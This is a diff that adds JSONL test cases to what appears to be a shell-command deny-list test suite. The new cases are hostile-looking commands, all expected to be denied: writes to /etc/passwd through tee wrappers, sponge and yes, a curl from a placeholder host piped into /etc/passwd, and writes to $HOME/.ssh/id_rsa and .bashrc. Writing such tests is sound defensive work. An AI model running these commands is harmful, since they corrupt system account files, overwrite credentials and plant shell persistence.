@@ -109,3 +109,10 @@
 {"command": "tee /etc/passwd", "expected": "deny", "source": "macr_89059632_tee", "description": "tee sensitive path must deny"}
 {"command": "tee -a /etc/shadow", "expected": "deny", "source": "macr_89059632_tee", "description": "tee append sensitive path must deny"}
 {"command": "tee /tmp/log", "expected": "allow", "source": "macr_89059632_tee", "description": "tee to tmp remains allowed"}
+{"command": "echo pwn | busybox tee /etc/passwd", "expected": "deny", "source": "macr_f2d6b5b6_writer_wrappers", "description": "pipe-to-busybox-tee sensitive path must deny"}
+{"command": "echo pwn | stdbuf -oL tee /etc/passwd", "expected": "deny", "source": "macr_f2d6b5b6_writer_wrappers", "description": "pipe-to-stdbuf-tee sensitive path must deny"}
+{"command": "echo pwn | sponge /etc/passwd", "expected": "deny", "source": "macr_f2d6b5b6_writer_wrappers", "description": "pipe-to-sponge sensitive path must deny"}
+{"command": "curl -s http://example/pwn | tee /etc/passwd", "expected": "deny", "source": "macr_f2d6b5b6_non_data_pipe", "description": "non-data-only pipe-to-tee must deny"}
+{"command": "yes x | tee /etc/passwd", "expected": "deny", "source": "macr_f2d6b5b6_non_data_pipe", "description": "yes pipe-to-tee sensitive path must deny"}
+{"command": "echo x | tee $HOME/.ssh/id_rsa", "expected": "deny", "source": "macr_f2d6b5b6_home_sink", "description": "pipe-to-tee $HOME sink must deny"}
+{"command": "echo x > $HOME/.bashrc", "expected": "deny", "source": "macr_f2d6b5b6_home_sink", "description": "redirect to $HOME must deny"}
